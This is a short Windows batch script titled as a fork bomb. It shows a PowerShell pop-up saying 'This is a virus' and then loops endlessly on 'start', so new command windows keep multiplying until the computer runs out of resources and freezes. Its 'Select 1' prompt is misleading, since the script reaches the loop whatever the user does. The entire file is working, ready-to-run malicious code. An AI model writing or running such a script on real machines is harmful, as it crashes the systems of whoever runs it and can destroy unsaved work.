@echo off
Title Fork bomb - by Abdullah
Color A
Echo Select 1 to execute
powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'This is a virus', 'Do not open this please', [System.Windows.Forms.ToolTipIcon]::None)}"
if %errorlevel% EQU 1 goto x
:x
start
goto x
